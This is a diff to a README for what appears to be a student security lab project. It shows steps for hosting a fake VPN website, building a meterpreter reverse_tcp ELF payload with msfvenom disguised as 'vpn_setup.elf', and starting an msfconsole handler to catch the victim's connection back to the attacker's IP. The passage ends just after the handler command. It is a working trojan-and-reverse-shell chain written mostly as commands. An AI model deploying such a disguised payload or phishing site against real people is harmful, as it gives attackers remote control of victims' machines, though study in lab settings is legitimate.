@@ -42,36 +42,36 @@ Kali's IP - 192.168.100.4 and Ubuntu's IP - 192.168.100.5
 
 In Kali Linux,
 
-Firstly, Clone the project to have the Fake Website ready for the victim to download the malicious VPN setup file. 
+Firstly, Clone the project to have the Fake VPN Website ready for the victim to download the malicious VPN setup file. 
 
 ```bash
-  git clone https://github.com/Pranauv-Kumar1803/ICS.git
+git clone https://github.com/Pranauv-Kumar1803/ICS.git
 ```
 
 Go to the project directory
 
 ```bash
-  cd ICS
+cd ICS
 ```
 
 Install dependencies in both client and server folder
 
 ```bash
-  npm install
+npm install
 ```
 
 Start the server
 
 ```bash
-  npm start
+npm start
 ```
 
 Next, create the malicious .elf executable file using msfvenom toolkit. The code is as given below:
 ```bash
-  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=4443 -f elf > vpn_setup.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=4443 -f elf > vpn_setup.elf
 ```
 
-Then, setup the Listener using msfconsole ( Listen on the same host ip address and port as mentioned in the creatino of the .elf file code above ):
+Then, setup the Listener using msfconsole (Listen on the same host ip address and port as mentioned in the creatino of the .elf file code above):
 ```bash
 msfconsole
 use exploit/multi/handler
